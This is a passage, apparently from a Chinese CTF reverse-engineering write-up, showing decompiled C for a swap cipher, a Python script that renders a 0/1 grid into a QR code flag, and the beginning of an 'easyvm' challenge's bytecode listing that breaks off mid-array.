&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__fastcall&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sub_400BD0&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; a1, &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;a2)
{
  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v2; &lt;span style=&#34;color:#75715e&#34;&gt;// er8
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v3; &lt;span style=&#34;color:#75715e&#34;&gt;// edx
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  _QWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;v4; &lt;span style=&#34;color:#75715e&#34;&gt;// r9
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  _QWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;v5; &lt;span style=&#34;color:#75715e&#34;&gt;// rcx
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v6; &lt;span style=&#34;color:#75715e&#34;&gt;// er9
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; v7; &lt;span style=&#34;color:#75715e&#34;&gt;// rax
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; v8; &lt;span style=&#34;color:#75715e&#34;&gt;// rcx
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; ( a2 ) {
    x &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; a2[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;];
    y &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; a2[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;];
    z &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; a2[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;];
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( x &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; ) {
      v2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; z;
      v3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; y &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
      &lt;span style=&#34;color:#66d9ef&#34;&gt;goto&lt;/span&gt; LABEL_4;
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( x &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; ) {
      v2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; z;
      v3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; y &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
      &lt;span style=&#34;color:#66d9ef&#34;&gt;goto&lt;/span&gt; LABEL_4;
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( x &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; ) {
      v2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; z &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
      v3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; y;
      &lt;span style=&#34;color:#66d9ef&#34;&gt;goto&lt;/span&gt; LABEL_4;
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( x &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; ) {
      v2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; z &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
      v3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; y;
    }
LABEL_4:
    v4 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;a1[z];
    v5 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;a1[v2];
    &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_BYTE &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(v7 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;v4) &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_BYTE &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;v5 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v3);
    &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_BYTE &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(v3 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;v5) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_BYTE &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;v4 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v7) &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_BYTE &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(v3 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;v5);
    &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_BYTE &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;v4 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v7) &lt;span style=&#34;color:#f92672&#34;&gt;-=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_BYTE &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;v5 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v3); &lt;span style=&#34;color:#75715e&#34;&gt;// 经典swap
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    a2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;((_QWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)a2 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;);              &lt;span style=&#34;color:#75715e&#34;&gt;// a2 = a2-&amp;gt;next
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;显然加密就是和周围某个位置交换一下&lt;/p&gt;
&lt;p&gt;解密和加密是对称的，直接把key文件反转过来，就是解密了&lt;/p&gt;
&lt;p&gt;接下来需要把01串变成图片&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; PIL &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; Image

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;black_block&lt;/span&gt;(image, x, y):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;):
            &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; j &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;):
                    image&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;putpixel((x &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; i, y &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; j), (&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;))

im &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Image&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;new(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;RGB&amp;#39;&lt;/span&gt;, (&lt;span style=&#34;color:#ae81ff&#34;&gt;125&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;125&lt;/span&gt;), &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;#FFFFFF&amp;#34;&lt;/span&gt;)

flag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;1111111001000101001111111&amp;#39;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;1000001011001001001000001&amp;#39;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;1011101001110011101011101&amp;#39;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;1011101001100010101011101&amp;#39;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;1011101011000111001011101&amp;#39;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;1000001001110111101000001&amp;#39;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;1111111010101010101111111&amp;#39;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;0000000000101101100000000&amp;#39;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;1010101000001110000010010&amp;#39;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;0011100010000110101001001&amp;#39;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;1001001100011110111010011&amp;#39;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;1110110110001111000101000&amp;#39;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;0101001011011100011101011&amp;#39;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;0101100101111010101001011&amp;#39;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;1001011011011000000100111&amp;#39;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;0101010010001110011110011&amp;#39;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;1001101001110010111111000&amp;#39;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;0000000011110000100011001&amp;#39;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;1111111001100101101010111&amp;#39;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;1000001001010001100010000&amp;#39;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;1011101011101000111111011&amp;#39;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;1011101000111101000010000&amp;#39;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;1011101010111011010110101&amp;#39;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;1000001001001111111010010&amp;#39;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;1111111011110011100011011&amp;#39;&lt;/span&gt;
]

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(len(flag)):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; j &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(len(flag[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;])):
            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; flag[i][j] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;1&amp;#39;&lt;/span&gt;:
                    black_block(im, i &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, j &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;)

im&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;show()

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;扫描二维码拿flag&lt;/p&gt;
&lt;h2 id=&#34;xman2018排位赛easyvm&#34;&gt;[XMAN2018排位赛]easyvm&lt;/h2&gt;
&lt;p&gt;vm题，上来先把字节翻译成汇编格式&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;vm_code &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x05&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x01&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0B&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x13&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x03&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x03&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x13&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x13&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x04&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x04&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x28&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0C&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x33&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x14&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x05&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x09&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x01&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x11&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x09&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0B&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0A&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x09&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x01&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x04&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0A&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1B&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x05&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x04&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0C&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x03&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x01&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x24&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x03&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x20&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x28&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x13&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x07&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x08&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x05&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0E&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x08&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xE0&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x07&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x02&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x08&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x09&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0A&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x02&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x01&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0A&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x18&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xE0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1E&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x05&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x01&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x04&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x13&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x03&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x03&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x28&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x09&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0A&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x02&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x01&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0A&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x18&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1F&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x03&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1B&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x05&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x07&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x08&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x05&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0E&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x08&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xE0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x07&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x02&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x08&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x09&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0A&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x02&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x01&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0A&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x18&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xE0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1E&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x05&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1D&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x05&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0A&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0D&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0A&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1B&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x05&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0A&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0C&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x03&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x01&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x24&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x03&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1F&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x28&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x09&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0A&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x02&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x01&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0A&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x18&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1F&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x03&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0D&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x04&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1B&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x05&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x13&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x03&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x03&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x03&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x04&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0D&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x28&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x07&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x08&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x05&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0E&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x08&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xE0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x07&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x02&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x08&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x09&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0A&lt;/span&gt;, 
